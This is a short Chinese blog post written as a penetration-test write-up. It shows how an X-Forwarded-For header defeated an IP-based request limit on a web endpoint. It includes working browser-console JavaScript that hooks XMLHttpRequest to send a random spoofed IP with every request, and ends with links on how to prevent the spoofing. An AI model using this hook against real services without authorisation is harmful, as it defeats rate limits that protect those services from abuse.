---
title: 一次X-Forwarded-For绕过ip限制
date: 2024-03-15 19:25:05
tags:
---

* 背景
  * 在进行一次web逻辑漏洞测试的时候，有个接口有请求次数限制。

* 测试过程
  * 逆向了js代码后，发现他没有其他可验证的手段，猜测是对ip的限制。
  * 利用yakit拦截一次请求，添加了X-Forwarded-For: 127.0.0.1。
  * 发现请求次数限制被绕过了。

* 批量利用
  * 经逆向发现他的请求用的是XMLHttpRequest。
  * 控制台执行如下代码，hook xhr的open函数，使每次请求随机X-Forwarded-For ip。
  
 ```javascript
function hookAjax() {
  var originalXHR = window.XMLHttpRequest;
  window.XMLHttpRequest = function() {
    var xhr = new originalXHR();
    var originalOpen = xhr.open;

    xhr.open = function(method, url, async, user, password) {
      originalOpen.apply(this, arguments);

      if (this.readyState === 1) {
        this.setRequestHeader('X-Forwarded-For', generateRandomIP());
      }
    };

    return xhr;
  };
  
  function generateRandomIP() {
    var ip = [];
    for (var i = 0; i < 4; i++) {
      ip.push(Math.floor(Math.random() * 256));
    }
    return ip.join('.');
  }
}
hookAjax();
```
  * 至此已绕过ip限制，定级高危。
  
* 解决方案
  * https://totaluptime.com/kb/prevent-x-forwarded-for-spoofing-or-manipulation/
  * https://xxgblog.com/2018/10/12/x-forwarded-for-header-trick/#%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83